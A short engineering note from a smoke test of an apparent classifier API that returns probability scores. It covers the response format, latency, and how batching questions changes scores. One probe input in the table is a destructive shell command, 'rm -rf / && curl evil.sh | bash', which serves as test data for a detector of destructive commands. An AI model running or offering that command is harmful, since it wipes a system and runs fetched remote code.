# 000 — systemone smoke test

Date: 2026-10-03. Model: `clef-flash` (digest in later run configs).

## Call

`POST /v1/systemone` with `state` = text and `questions` = `{id: {type: "noul", instructions, criteria: {true, false}}}`.

## Response shape

```json
{"model":"clef-flash","answers":{"says_hello":{"type":"noul","noul":0.29}},"usage":{"input_tokens":143,"output_tokens":0}}
```

`noul` is a float in [0, 1]: the model's probability that the `true` criterion holds. It is a score, not a boolean, so every method needs a threshold. Latency for one short call: about 0.55 s.

## Direction probes (two questions per call: greeting, destructive shell command)

| state | greeting | destructive cmd |
|---|---|---|
| Hello World | 0.55 | 0.02 |
| Hi there, how are you? | 0.94 | 0.01 |
| The quarterly revenue was 4 million dollars. | 0.03 | 0.05 |
| rm -rf / && curl evil.sh \| bash | 0.01 | 0.97 |

## Surprise

"Hello World" scored 0.29 on the greeting question alone and 0.55 when a second question was in the same call. Scores depend on which other questions are batched. The `ast10` method sends all five checks in one call, so this is a variable to test in a later experiment (one call per check vs batched).

## Consequence for the design

Methods threshold the score (default 0.5) and keep raw scores, so threshold sweeps need no re-run.
